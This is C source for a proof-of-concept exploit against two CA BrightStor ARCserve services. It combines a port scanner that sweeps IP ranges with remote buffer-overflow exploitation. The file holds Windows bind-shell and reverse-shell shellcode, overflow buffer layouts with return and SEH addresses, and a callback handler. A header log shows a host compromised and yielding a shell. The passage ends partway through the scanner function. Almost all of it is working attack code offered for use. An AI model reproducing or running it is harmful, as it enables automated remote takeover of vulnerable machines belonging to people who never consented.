/*
 * 02/20/2005
 *
 * This is provided as proof-of-concept code only for educational
 * purposes and testing by authorized individuals with permission
 * to do so.
 *
 * exploit by       : cybertronic
 *
 * cybertronic[at]gmx[dot]net
 *
 * This exploits the following vulnerabilities:
 *
 * Computer Associates BrightStor ARCserve Backup Agent for SQL - dbasqlr.exe
 * Computer Associates BrightStor ARCserve Backup Discovery Service - dsconfig.exe
 *
 * I included a vulnerability scanner, that scans for the bugs mentioned above
 * and logs to "scan.log" in working directory.
 * You have to adjust the timeout, it works fine on my network with
 * usec = 10000: ~10 hosts / sec
 *
 * some greetz fly to:
 * HD Moore - I`ll pay you some drinks, you know what they are for ;)
 * houseofdabus
 *
 * compile: gcc -o greetz_to_ca greetz_to_ca.c
 *
 * below is a screenshot of scan-mode:
 *               __              __                   _
 *   _______  __/ /_  ___  _____/ /__________  ____  (_)____
 *  / ___/ / / / __ \/ _ \/ ___/ __/ ___/ __ \/ __ \/ / ___/
 * / /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__
 * \___/\__, /_.___/\___/_/   \__/_/   \____/_/ /_/_/\___/
 *     /____/
 *
 * --[ exploit by : cybertronic - cybertronic[at]gmx[dot]net
 *
 * --[ choose
 *       |
 *       |--[0] = start scanner
 *       `--[1] = send some greetings to ca
 *
 *  $ 0
 *
 * --[ enter IP-range
 *       |
 *       |--[start-ip] $ 192.168.2.90
 *       `--[end-ip  ] $ 192.168.2.120
 *
 * --[ select port to scan for
 *       |
 *       |--[ 6070] = dbasqlr
 *       `--[41523] = dsconfig
 *
 *  $ 6070
 *
 * --[ I can try to exploit the bug, shall I ?
 *       |
 *       |--[0] yes, try it!
 *       `--[1] no, i`am on my own!
 *
 *  $ 0
 *
 * --[ select shellcode
 *       |
 *       |--[0] = bindshell
 *       `--[1] = reverseshell
 *
 *  $ 0
 *
 * oO---[ scanner - scan.log ]---Oo
 *
 * [192.168.2.90:6070] closed
 * [192.168.2.91:6070] closed
 * [192.168.2.92:6070] closed
 * [192.168.2.93:6070] closed
 * [192.168.2.94:6070] closed
 * [192.168.2.95:6070] closed
 * [192.168.2.96:6070] closed
 * [192.168.2.97:6070] closed
 * [192.168.2.98:6070] closed
 * [192.168.2.99:6070] closed
 * [192.168.2.100:6070] closed
 * [192.168.2.101:6070] open
 *

// the first one is a fake service that was running by accident ( netcat -l -p 6070 )


 * oO---[    exploitation    ]---Oo
 *
 * --[ connecting to 192.168.2.101:6070...done!
 * --[ exploiting dbasqlr.exe...
 * --[ sending packet [ 3288 bytes ]...done!
 * --[ sleeping 5 seconds...
 * --[ connecting to 192.168.2.101:4444...failed!
 *
 * [192.168.2.102:6070] open
 *
 * oO---[    exploitation    ]---Oo
 *
 * --[ connecting to 192.168.2.102:6070...done!
 * --[ exploiting dbasqlr.exe...
 * --[ sending packet [ 3288 bytes ]...done!
 * --[ sleeping 5 seconds...
 * --[ connecting to 192.168.2.102:4444...done!
 * --[ b0x pwned - h4ve phun
 * Microsoft Windows XP [Version 5.1.2600]
 * (C) Copyright 1985-2001 Microsoft Corp.
 *
 * C:\WINDOWS\system32>exit
 * exit
 * bye bye...
 * [192.168.2.103:6070] closed
 * [192.168.2.104:6070] closed
 * [192.168.2.105:6070] closed
 * [192.168.2.106:6070] closed
 * [192.168.2.107:6070] closed
 * [192.168.2.108:6070] closed
 * [192.168.2.109:6070] closed
 * [192.168.2.110:6070] closed
 * [192.168.2.111:6070] closed
 * [192.168.2.112:6070] closed
 * [192.168.2.113:6070] closed
 * [192.168.2.114:6070] closed
 * [192.168.2.115:6070] closed
 * [192.168.2.116:6070] closed
 * [192.168.2.117:6070] closed
 * [192.168.2.118:6070] closed
 * [192.168.2.119:6070] closed
 * [192.168.2.120:6070] closed
 *
 * oO---[   scan completed   ]---Oo
 *
 * [ cybertronic @ CA ] #
 *
 */

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <errno.h>

/*
 *
 * definitions
 *
 */

#define PORT_DBASQLR	6070
#define PORT_DSCONFIG	41523

#define RED		"\E[31m\E[1m"
#define GREEN	"\E[32m\E[1m"
#define YELLOW	"\E[33m\E[1m"
#define BLUE	"\E[34m\E[1m"
#define NORMAL	"\E[m"

/*
 *
 * prototypes
 *
 */

int connect_to_remote_host ( char* tip, unsigned short tport );
int exploit_dbasqlr ( int s, unsigned long xoredip, unsigned short xoredcbport, int option );
int exploit_dsconfig ( int s, unsigned long xoredip, unsigned short xoredcbport, int option );
int isip ( char *ip );
int is_open ( char* ip, unsigned short tport );
int select_action ();
int select_shellcode ();
int select_vulnerability ();
int shell ( int s, char* tip, unsigned short cbport );

void connect_to_bindshell ( char* tip, unsigned short bport );
void fall_asleep ( int sec );
void header ();
void start_reverse_handler ( int cbport );
void usage ( char* name );

/*********************
 * Windows Shellcode *
 *********************/

/*
 * Type  : bind shellcode
 * Length: 500 bytes
 * Port  : 4444 / 0x115c
 *
 */

unsigned char bindshell[] =
"\xeb\x19\x5e\x31\xc9\x81\xe9\x89\xff\xff\xff\x81\x36\x80\xbf\x32"
"\x94\x81\xee\xfc\xff\xff\xff\xe2\xf2\xeb\x05\xe8\xe2\xff\xff\xff"
"\x03\x53\x06\x1f\x74\x57\x75\x95\x80\xbf\xbb\x92\x7f\x89\x5a\x1a"
"\xce\xb1\xde\x7c\xe1\xbe\x32\x94\x09\xf9\x3a\x6b\xb6\xd7\x9f\x4d"
"\x85\x71\xda\xc6\x81\xbf\x32\x1d\xc6\xb3\x5a\xf8\xec\xbf\x32\xfc"
"\xb3\x8d\x1c\xf0\xe8\xc8\x41\xa6\xdf\xeb\xcd\xc2\x88\x36\x74\x90"
"\x7f\x89\x5a\xe6\x7e\x0c\x24\x7c\xad\xbe\x32\x94\x09\xf9\x22\x6b"
"\xb6\xd7\x4c\x4c\x62\xcc\xda\x8a\x81\xbf\x32\x1d\xc6\xab\xcd\xe2"
"\x84\xd7\xf9\x79\x7c\x84\xda\x9a\x81\xbf\x32\x1d\xc6\xa7\xcd\xe2"
"\x84\xd7\xeb\x9d\x75\x12\xda\x6a\x80\xbf\x32\x1d\xc6\xa3\xcd\xe2"
"\x84\xd7\x96\x8e\xf0\x78\xda\x7a\x80\xbf\x32\x1d\xc6\x9f\xcd\xe2"
"\x84\xd7\x96\x39\xae\x56\xda\x4a\x80\xbf\x32\x1d\xc6\x9b\xcd\xe2"
"\x84\xd7\xd7\xdd\x06\xf6\xda\x5a\x80\xbf\x32\x1d\xc6\x97\xcd\xe2"
"\x84\xd7\xd5\xed\x46\xc6\xda\x2a\x80\xbf\x32\x1d\xc6\x93\x01\x6b"
"\x01\x53\xa2\x95\x80\xbf\x66\xfc\x81\xbe\x32\x94\x7f\xe9\x2a\xc4"
"\xd0\xef\x62\xd4\xd0\xff\x62\x6b\xd6\xa3\xb9\x4c\xd7\xe8\x5a\x96"
"\x80\xae\x6e\x1f\x4c\xd5\x24\xc5\xd3\x40\x64\xb4\xd7\xec\xcd\xc2"
"\xa4\xe8\x63\xc7\x7f\xe9\x1a\x1f\x50\xd7\x57\xec\xe5\xbf\x5a\xf7"
"\xed\xdb\x1c\x1d\xe6\x8f\xb1\x78\xd4\x32\x0e\xb0\xb3\x7f\x01\x5d"
"\x03\x7e\x27\x3f\x62\x42\xf4\xd0\xa4\xaf\x76\x6a\xc4\x9b\x0f\x1d"
"\xd4\x9b\x7a\x1d\xd4\x9b\x7e\x1d\xd4\x9b\x62\x19\xc4\x9b\x22\xc0"
"\xd0\xee\x63\xc5\xea\xbe\x63\xc5\x7f\xc9\x02\xc5\x7f\xe9\x22\x1f"
"\x4c\xd5\xcd\x6b\xb1\x40\x64\x98\x0b\x77\x65\x6b\xd6\x93\xcd\xc2"
"\x94\xea\x64\xf0\x21\x8f\x32\x94\x80\x3a\xf2\xec\x8c\x34\x72\x98"
"\x0b\xcf\x2e\x39\x0b\xd7\x3a\x7f\x89\x34\x72\xa0\x0b\x17\x8a\x94"
"\x80\xbf\xb9\x51\xde\xe2\xf0\x90\x80\xec\x67\xc2\xd7\x34\x5e\xb0"
"\x98\x34\x77\xa8\x0b\xeb\x37\xec\x83\x6a\xb9\xde\x98\x34\x68\xb4"
"\x83\x62\xd1\xa6\xc9\x34\x06\x1f\x83\x4a\x01\x6b\x7c\x8c\xf2\x38"
"\xba\x7b\x46\x93\x41\x70\x3f\x97\x78\x54\xc0\xaf\xfc\x9b\x26\xe1"
"\x61\x34\x68\xb0\x83\x62\x54\x1f\x8c\xf4\xb9\xce\x9c\xbc\xef\x1f"
"\x84\x34\x31\x51\x6b\xbd\x01\x54\x0b\x6a\x6d\xca\xdd\xe4\xf0\x90"
"\x80\x2f\xa2\x04";

/*
 * Type  : connect back shellcode
 * Length: 316 bytes
 * CBIP  : reverseshell[111] ( ^ 0x99999999 )
 * CBPort: reverseshell[118] ( ^ 0x9999 )
 *
 */

unsigned char reverseshell[] =
"\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\x99\xE2\xFA"
"\xEB\x05\xE8\xEB\xFF\xFF\xFF\x70\x62\x99\x99\x99\xC6\xFD\x38\xA9"
"\x99\x99\x99\x12\xD9\x95\x12\xE9\x85\x34\x12\xF1\x91\x12\x6E\xF3"
"\x9D\xC0\x71\x02\x99\x99\x99\x7B\x60\xF1\xAA\xAB\x99\x99\xF1\xEE"
"\xEA\xAB\xC6\xCD\x66\x8F\x12\x71\xF3\x9D\xC0\x71\x1B\x99\x99\x99"
"\x7B\x60\x18\x75\x09\x98\x99\x99\xCD\xF1\x98\x98\x99\x99\x66\xCF"
"\x89\xC9\xC9\xC9\xC9\xD9\xC9\xD9\xC9\x66\xCF\x8D\x12\x41\xF1\xE6"
"\x99\x99\x98\xF1\x9B\x99\x9D\x4B\x12\x55\xF3\x89\xC8\xCA\x66\xCF"
"\x81\x1C\x59\xEC\xD3\xF1\xFA\xF4\xFD\x99\x10\xFF\xA9\x1A\x75\xCD"
"\x14\xA5\xBD\xF3\x8C\xC0\x32\x7B\x64\x5F\xDD\xBD\x89\xDD\x67\xDD"
"\xBD\xA4\x10\xC5\xBD\xD1\x10\xC5\xBD\xD5\x10\xC5\xBD\xC9\x14\xDD"
"\xBD\x89\xCD\xC9\xC8\xC8\xC8\xF3\x98\xC8\xC8\x66\xEF\xA9\xC8\x66"
"\xCF\x9D\x12\x55\xF3\x66\x66\xA8\x66\xCF\x91\xCA\x66\xCF\x85\x66"
"\xCF\x95\xC8\xCF\x12\xDC\xA5\x12\xCD\xB1\xE1\x9A\x4C\xCB\x12\xEB"
"\xB9\x9A\x6C\xAA\x50\xD0\xD8\x34\x9A\x5C\xAA\x42\x96\x27\x89\xA3"
"\x4F\xED\x91\x58\x52\x94\x9A\x43\xD9\x72\x68\xA2\x86\xEC\x7E\xC3"
"\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D"
"\x12\x9A\x5C\x32\xC7\xC0\x5A\x71\x99\x66\x66\x66\x17\xD7\x97\x75"
"\xEB\x67\x2A\x8F\x34\x40\x9C\x57\x76\x57\x79\xF9\x52\x74\x65\xA2"
"\x40\x90\x6C\x34\x75\x60\x33\xF9\x7E\xE0\x5F\xE0";

unsigned char greetz[] =
"\x20\x41\x54\x20\x4c\x45\x41\x53\x54\x20\x53\x4f\x4d\x45\x20\x47"
"\x52\x45\x45\x54\x5a\x20\x46\x4c\x59\x20\x54\x4f\x3a\x20\x48\x44"
"\x4d\x2c\x20\x54\x48\x43\x2c\x20\x41\x4e\x44\x20\x43\x41\x20\x4f"
"\x46\x20\x43\x4f\x55\x52\x53\x45\x20\x3a\x29\x20\x2d\x20\x43\x59"
"\x42\x45\x52\x54\x52\x4f\x4e\x49\x43\x20";

/*
 *
 * structures
 *
 */

typedef struct _args {
	char* tip;
	char* lip;
	int tport;
	int lport;;
} args;

/*
 *
 * functions
 *
 */

int
connect_to_remote_host ( char* tip, unsigned short tport )
{
	int s;
	struct sockaddr_in remote_addr;
	struct hostent* host_addr;

	memset ( &remote_addr, 0x0, sizeof ( remote_addr ) );
	if ( ( host_addr = gethostbyname ( tip ) ) == NULL )
	{
		printf ( "cannot resolve \"%s\"\n", tip );
		exit ( 1 );
	}
	remote_addr.sin_family = AF_INET;
	remote_addr.sin_port = htons ( tport );
	remote_addr.sin_addr = * ( ( struct in_addr * ) host_addr->h_addr );
	if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
	{
		printf ( "socket failed!\n" );
		exit ( 1 );
	}
	printf ( "--[ connecting to %s:%u...", tip, tport  );
	if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
	{
		printf ( "failed!\n" );
		exit ( 1 );
	}
	printf ( "done!\n" );
	return ( s );
}

int
exploit_dbasqlr ( int s, unsigned long xoredip, unsigned short xoredcbport, int option )
{
	unsigned long pushesp = 0x20c0c1ab; //Asbrdcst.dll
	char buffer[3289];

	bzero ( &buffer, sizeof ( buffer ) );
	memset ( buffer, 0x41, sizeof ( buffer ) - 1 );
	memcpy ( buffer + 14, greetz, sizeof ( greetz ) - 1 );
	memcpy ( buffer + 1337, "\x81\xc4\x54\xf2\xff\xff", 6 );  //good code     <-------.
	memcpy ( buffer + 3168, ( unsigned char* ) &pushesp, 4 ); //                      |
	memcpy ( buffer + 3172, "\xe9\xd0\xf8\xff\xff", 5 );      //jmp back 1840 bytes --'

	if ( option == 0 )
	{
		memcpy ( &reverseshell[111], &xoredip, 4);
		memcpy ( &reverseshell[118], &xoredcbport, 2);
		memcpy ( buffer + 1343, reverseshell, sizeof ( reverseshell ) - 1 );
	}
	else
		memcpy ( buffer + 1343, bindshell, sizeof ( bindshell ) - 1 );

	printf ( "--[ exploiting " YELLOW "dbasqlr.exe" NORMAL"...\n" );
	printf ( "--[ sending packet [ %u bytes ]...", strlen ( buffer ) );
	if ( write ( s, buffer, strlen ( buffer ) ) <= 0 )
	{
		printf ( RED "failed!\n" NORMAL);
		return ( 1 );
	}
	printf ( YELLOW "done!\n" NORMAL);
	sleep ( 1 );
	close ( s );
	return ( 0 );
}

int
exploit_dsconfig ( int s, unsigned long xoredip, unsigned short xoredcbport, int option )
{
	char buffer[4129];

	bzero ( &buffer, sizeof ( buffer ) );
	memset ( buffer, 0x41, sizeof ( buffer ) - 1 );

	buffer[ 0] = 0x9b;
	buffer[ 1] = 0x53; //S
	buffer[ 2] = 0x45; //E
	buffer[ 3] = 0x52; //R
	buffer[ 4] = 0x56; //V
	buffer[ 5] = 0x49; //I
	buffer[ 6] = 0x43; //C
	buffer[ 7] = 0x45; //E
	buffer[ 8] = 0x50; //P
	buffer[ 9] = 0x43; //C
	buffer[10] = 0x18;
	buffer[11] = 0x01;
	buffer[12] = 0x02;
	buffer[13] = 0x03;
	buffer[14] = 0x04;
	buffer[15] = 0x53; //S
	buffer[16] = 0x45; //E
	buffer[17] = 0x52; //R
	buffer[18] = 0x56; //V
	buffer[19] = 0x49; //I
	buffer[20] = 0x43; //C
	buffer[21] = 0x45; //E
	buffer[22] = 0x50; //P
	buffer[23] = 0x43; //C
	buffer[24] = 0x01;
	buffer[25] = 0x0c;
	buffer[26] = 0x6c;
	buffer[27] = 0x93;
	buffer[28] = 0xce;
	buffer[29] = 0x18;
	buffer[30] = 0x18;

	memcpy ( buffer + 14, greetz, sizeof ( greetz ) - 1 );
	memcpy ( buffer + 1056, "\xeb\x06", 2 );
	memcpy ( buffer + 1060, "\x14\x57\x80\x23", 4 ); //SEH
	if ( option == 0 )
	{
		memcpy ( &reverseshell[111], &xoredip, 4);
		memcpy ( &reverseshell[118], &xoredcbport, 2);
		memcpy ( buffer + 1064, reverseshell, sizeof ( reverseshell ) - 1 );
	}
	else
		memcpy ( buffer + 1064, bindshell, sizeof ( bindshell ) - 1 );

	printf ( "--[ exploiting " YELLOW "dsconfig.exe" NORMAL "...\n" );
	printf ( "--[ sending packet [ %u bytes ]...", strlen ( buffer ) );
	if ( write ( s, buffer, strlen ( buffer ) ) <= 0 )
	{
		printf ( RED "failed!\n" NORMAL);
		return ( 1 );
	}
	printf ( YELLOW "done!\n" NORMAL);
	sleep ( 1 );
	close ( s );
	return ( 0 );
}

int
isip ( char *ip )
{
	int a, b, c, d;

	if ( !sscanf ( ip, "%d.%d.%d.%d", &a, &b, &c, &d ) )
		return ( 0 );
	if ( a < 1 )
		return ( 0 );
	if ( a > 255 )
		return 0;
	if ( b < 0 )
		return 0;
	if ( b > 255 )
		return 0;
	if ( c < 0 )
		return 0;
	if ( c > 255 )
		return 0;
	if ( d < 0 )
		return 0;
	if ( d > 255 )
		return 0;
	return 1;
}

int
is_open ( char* ip, unsigned short tport )
{
	int s, n, error;
	int flags;
	int sec = 0; //change this for wan
	unsigned long usec = 10000; //works fine on my lan
	struct sockaddr_in remote_addr;
	struct timeval tval;
	fd_set rset, wset;
	socklen_t len;

	memset ( &remote_addr, 0x0, sizeof ( remote_addr ) );
	remote_addr.sin_family = AF_INET;
	remote_addr.sin_port = htons ( tport );
	inet_pton ( AF_INET, ip, &remote_addr.sin_addr );
	if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
	{
		printf ( "socket failed!\n" );
		exit ( -1 );
	}

	if ( ( flags = fcntl ( s, F_GETFL, 0 ) ) < 0 )
	{
		close ( s );
		return ( -1 );
	}
	if ( fcntl ( s, F_SETFL, flags | O_NONBLOCK ) < 0 )
	{
		close ( s );
		return ( -1 );
	}
	if ( ( n = connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ) ==  -1 )
	{
		if ( errno != EINPROGRESS )
		{
			close ( s );
			return ( -1 );
		}
	}
	if ( n == 0 )
		goto done; /* connect completed immediately */
	FD_ZERO ( &rset );
	FD_SET ( s, &rset );
	wset = rset;
	tval.tv_sec = sec;
	tval.tv_usec = usec;

	if ( ( n = select ( s + 1, &rset, &wset, NULL, &tval ) ) == 0 )
	{
		close ( s ); /* timeout */
		errno = ETIMEDOUT;
		return ( 1 );
	}
	if ( FD_ISSET ( s, &rset ) || FD_ISSET ( s, &wset ) )
	{
		len = sizeof ( error );
		if ( getsockopt ( s, SOL_SOCKET, SO_ERROR, &error, &len ) < 0 )
			return ( -1 );
	}
	else
	{
		printf ( "select failed!\n" );
		exit ( 1 );
	}
	done:
		if ( fcntl ( s, F_SETFL, flags ) < 0 )
		{
			close ( s );
			return ( -1 );
		}
		if ( error )
		{
			close ( s );
			errno = error;
			return ( -1 );
		}
	return ( 0 );
}

int
select_action ()
{
	int ret;

	printf ( "\n" );
	printf ( "--[ choose\n" );
	printf ( "      |\n" );
	printf ( "      |--" RED "[" NORMAL "0" RED "]" NORMAL " = start scanner\n" );
	printf ( "      `--" RED "[" NORMAL "1" RED "]" NORMAL " = send some greetings to ca\n" );
	printf ( "\n" );
	printf ( " $ " );
	scanf ( "%d", &ret );
	if ( ret != 0 && ret != 1 )
	{
		printf ( "--[ invalid option!\n" );
		exit ( 1 );
	}
	return ( ret );
}

int
select_shellcode ()
{
	int ret;

	printf ( "\n" );
	printf ( "--[ select shellcode\n" );
	printf ( "      |\n" );
	printf ( "      |--" RED "[" NORMAL "0" RED "]" NORMAL " = bindshell\n" );
	printf ( "      `--" RED "[" NORMAL "1" RED "]" NORMAL " = reverseshell\n" );
	printf ( "\n" );
	printf ( " $ " );
	scanf ( "%d", &ret );
	if ( ret != 0 && ret != 1 )
	{
		printf ( "--[ invalid shellcode!\n" );
		exit ( 1 );
	}
	return ( ret );
}

int
select_vulnerability ()
{
	int ret;

	printf ( "\n" );
	printf ( "--[ select vulnerability\n" );
	printf ( "      |\n" );
	printf ( "      |--" RED "[" NORMAL "0" RED "]" NORMAL " = dbasqlr\n" );
	printf ( "      `--" RED "[" NORMAL "1" RED "]" NORMAL " = dsconfig\n" );
	printf ( "\n" );
	printf ( " $ " );
	scanf ( "%d", &ret );
	if ( ret != 0 && ret != 1 )
	{
		printf ( "--[ invalid option!\n" );
		exit ( 1 );
	}
	return ( ret );
}

int
shell ( int s, char* tip, unsigned short cbport )
{
	int n;
	char buffer[2048];
	fd_set fd_read;

	printf ( "--[" YELLOW " b" NORMAL "0" YELLOW "x " NORMAL "p" YELLOW "w" NORMAL "n" YELLOW "e" NORMAL "d " YELLOW "- " NORMAL "h" YELLOW "4" NORMAL "v" YELLOW "e " NORMAL "p" YELLOW "h" NORMAL "u" YELLOW "n" NORMAL "\n" );

	FD_ZERO ( &fd_read );
	FD_SET ( s, &fd_read );
	FD_SET ( 0, &fd_read );

	while ( 1 )
	{
		FD_SET ( s, &fd_read );
		FD_SET ( 0, &fd_read );

		if ( select ( s + 1, &fd_read, NULL, NULL, NULL ) < 0 )
			break;
		if ( FD_ISSET ( s, &fd_read ) )
		{
			if ( ( n = recv ( s, buffer, sizeof ( buffer ), 0 ) ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
			if ( write ( 1, buffer, n ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
		}
		if ( FD_ISSET ( 0, &fd_read ) )
		{
			if ( ( n = read ( 0, buffer, sizeof ( buffer ) ) ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
			if ( send ( s, buffer, n, 0 ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
		}
		usleep(10);
	}
}

void
connect_to_bindshell ( char* tip, unsigned short bport )
{
	int s;
	int sec = 5; // change this for fast targets
	struct sockaddr_in remote_addr;
	struct hostent* host_addr;

	if ( ( host_addr = gethostbyname ( tip ) ) == NULL )
	{
		fprintf ( stderr, "cannot resolve \"%s\"\n", tip );
		exit ( 1 );
	}

	remote_addr.sin_family = AF_INET;
	remote_addr.sin_addr   = * ( ( struct in_addr * ) host_addr->h_addr );
	remote_addr.sin_port   = htons ( bport );

	if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
	{
		printf ( "socket failed!\n" );
		exit ( 1 );
	}
	printf ( "--[ sleeping %d seconds...\n", sec );
	fall_asleep ( sec );
	printf ( "--[ connecting to %s:%u...", tip, bport );
	if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
	{
		printf ( RED "failed!\n\n" NORMAL);
		exit ( 1 );
	}
	printf ( YELLOW "done!\n" NORMAL);
	shell ( s, tip, bport );
}

void
fall_asleep ( int sec )
{
	sleep ( sec );
}

void
header ()
{
	printf ( YELLOW "              __              __                   _           \n" );
	printf ( "  _______  __/ /_  ___  _____/ /__________  ____  (_)____      \n" );
	printf ( " / ___/ / / / __ \\/ _ \\/ ___/ __/ ___/ __ \\/ __ \\/ / ___/  \n" );
	printf ( "/ /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__        \n" );
	printf ( "\\___/\\__, /_.___/\\___/_/   \\__/_/   \\____/_/ /_/_/\\___/  \n" );
	printf ( "    /____/                                                     \n\n" NORMAL );
	printf ( "--[ exploit by : cybertronic - cybertronic[at]gmx[dot]net\n" );
}

void
parse_arguments ( int argc, char* argv[], args* argp )
{
	int i = 0;

	while ( ( i = getopt ( argc, argv, "t:l:p:" ) ) != -1 )
	{
		switch ( i )
		{
			case 't':
				argp->tip = optarg;
				break;
			case 'l':
				argp->lip = optarg;
				break;
			case 'p':
				argp->lport = atoi ( optarg );
				break;
			case ':':
			case '?':
			default:
				usage ( argv[0] );
	    }
    }

    if ( argp->tip == NULL || argp->lip == NULL ||  argp->lport < 1 || argp->lport > 65535 )
		usage ( argv[0] );
}

void
start_reverse_handler ( int cbport )
{
	int s1, s2;
	struct sockaddr_in cliaddr, servaddr;
	socklen_t clilen = sizeof ( cliaddr );

	bzero ( &servaddr, sizeof ( servaddr ) );
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl ( INADDR_ANY );
	servaddr.sin_port = htons ( cbport );

	printf ( "--[ starting reverse handler [port: %u]...", cbport );
	if ( ( s1 = socket ( AF_INET, SOCK_STREAM, 0 ) ) == -1 )
	{
		printf ( "socket failed!\n" );
		exit ( 1 );
	}
	bind ( s1, ( struct sockaddr * ) &servaddr, sizeof ( servaddr ) );
	if ( listen ( s1, 1 ) == -1 )
	{
		printf ( "listen failed!\n" );
		exit ( 1 );
	}
	printf ( YELLOW "done!\n" NORMAL);
	if ( ( s2 = accept ( s1, ( struct sockaddr * ) &cliaddr, &clilen ) ) < 0 )
	{
		printf ( "accept failed!\n" );
		exit ( 1 );
	}
	close ( s1 );
	printf ( "--[ incomming connection from:\t" YELLOW " %s\n" NORMAL, inet_ntoa ( cliaddr.sin_addr ) );
	shell ( s2, ( char* ) inet_ntoa ( cliaddr.sin_addr ), cbport );
	close ( s2 );
}

void
start_scanner ( args* argp )
{
	int i;
	int s;
	int fd;
	int sc;
	int option;
	int ip1 = 0, a = 0;
	int ip2 = 0, b = 0;
	int ip3 = 0, c = 0;
	int ip4 = 0, d = 0;
	int status = 0;
	char scan_ip[256];
	char end_ip[256];
	char line[256];
	char system_time[64];
	unsigned short port;
	unsigned short xoredcbport;
	unsigned long BRUTE_DELAY = 100000;
	unsigned long MAX_CHILDS = 40;
	unsigned long xoredcbip;
	time_t ticks = time ( NULL );

	bzero ( &scan_ip, sizeof ( scan_ip ) );
	bzero ( &end_ip, sizeof ( end_ip ) );
	bzero ( &system_time, sizeof ( system_time ) );

	printf ( "\n" );
	printf ( "--[ enter IP-range\n" );
	printf ( "      |\n" );
	printf ( "      |--" RED "[" NORMAL "start-ip" RED "]" NORMAL );
	printf ( " $ " );
	scanf ( "%s", scan_ip );
	sscanf ( scan_ip, "%u.%u.%u.%u", &ip1, &ip2, &ip3, &ip4 );
	if ( !isip ( scan_ip ) )
	{
		printf ( "Invalid IP!\n" );
		exit ( 1 );
	}
	printf ( "      `--" RED "[" NORMAL "end-ip  " RED "]" NORMAL );
	printf ( " $ " );
	scanf ( "%s", end_ip );
	sscanf ( end_ip, "%u.%u.%u.%u", &a, &b, &c, &d );
	if ( !isip ( end_ip ) )
	{
		printf ( "Invalid IP!\n" );
		exit ( 1 );
	}
	printf ( "\n" );
	printf ( "--[ select port to scan for\n" );
	printf ( "      |\n" );
	printf ( "      |--" RED "[" NORMAL " 6070" RED "]" NORMAL " = dbasqlr\n" );
	printf ( "      `--" RED "[" NORMAL "41523" RED "]" NORMAL " = dsconfig\n" );
	printf ( "\n" );
	printf ( " $ " );
	scanf ( "%u", &port );
	if ( port != 6070 && port != 41523 )
	{
		printf ( "--[ I`m only scanning for port 6070 and 41523!\n" );
		exit ( 1 );
	}
	printf ( "\n" );
	printf ( "--[ I can try to exploit the bug, shall I ?\n" );
	printf ( "      |\n" );
	printf ( "      |--" RED "[" NORMAL "0" RED "]" NORMAL " yes, try it!\n" );
	printf ( "      `--" RED "[" NORMAL "1" RED "]" NORMAL " no, i`am on my own!\n" );
	printf ( "\n" );
	printf ( " $ " );
	scanf ( "%u", &option );
	if ( option != 0 && option != 1 )
	{
		printf ( "--[ invalid option!\n" );
		exit ( 1 );
	}
	if ( option == 0 )
		sc = select_shellcode ();

	if ( ( fd = open ( "scan.log", O_CREAT | O_WRONLY | O_APPEND, S_IREAD | S_IWRITE ) ) == -1 )
	{
		printf ( "open failed!\n" );
		exit ( 1 );
	}

	snprintf ( system_time, sizeof ( system_time ) -1, "\nDate: %s\n\n", ctime ( &ticks ) );
	if ( write ( fd, system_time, strlen ( system_time ) -1 ) <= 0 )
	{
		printf ( RED "failed!\n" NORMAL);
		exit ( 1 );
	}

	printf ( "\noO---[ scanner - scan.log ]---Oo\n\n" );

	while ( 1 )
	{
		if ( ip3 > 254 ) { ip3 = 1; ip2++; }
		if ( ip2 > 254 ) { ip2 = 1; ip1++; }
		if ( ip1 > 254 )
			exit ( 0 );

		for ( ip4; ip4 < 255; ip4++ )
		{
			i++;
			bzero ( &scan_ip, sizeof ( scan_ip ) );
			snprintf ( scan_ip, sizeof ( scan_ip ) -1, "%u.%u.%u.%u", ip1, ip2, ip3, ip4 );
			usleep ( BRUTE_DELAY );
			switch ( fork () )
			{
				case 0:
				{
					switch ( is_open ( scan_ip, port ) )
					{
						case 0:
						{
							printf ( "[%s:%d] " GREEN "open" NORMAL "\n", scan_ip, port );
							bzero ( &line, sizeof ( line ) );
							snprintf ( line, sizeof ( line ) -1, "[%s:%d]\n\n", scan_ip, port );
							if ( write ( fd, line, strlen ( line ) -1 ) <= 0 )
							{
								printf ( RED "failed!\n" NORMAL);
								exit ( 1 );
							}
							if ( option == 0 )
							{
								printf ( "\n" );
								printf ( "oO---[    exploitation    ]---Oo\n" );
								printf ( "\n" );
								s = connect_to_remote_host ( scan_ip, port );
								switch( sc )
								{
									case 0:
									{
										if ( port == 6070 )
										{
											if ( exploit_dbasqlr ( s, ( unsigned long ) NULL, ( unsigned short ) NULL, 1 ) == 1 )
											{
												printf ( "exploitation failed!\n" );
												exit ( 1 );
											}
											connect_to_bindshell ( scan_ip, 4444 );
											break;
										}
										else
										{
											if ( exploit_dsconfig ( s, ( unsigned long ) NULL, ( unsigned short ) NULL, 1 ) == 1 )
											{
												printf ( "exploitation failed!\n" );
												exit ( 1 );
											}
											connect_to_bindshell ( scan_ip, 4444 );
											break;
										}
									}
									case 1:
									{
										if ( port == 6070 )
										{
											xoredcbip = inet_addr ( argp->lip ) ^ ( unsigned long ) 0x99999999;
											xoredcbport = htons (  argp->lport ) ^ ( unsigned short ) 0x9999;
											if ( exploit_dbasqlr ( s, xoredcbip, xoredcbport, 0 ) == 1 )
											{
												printf ( "exploitation failed!\n" );
												exit ( 1 );
											}
											start_reverse_handler ( argp->lport );
											break;
										}
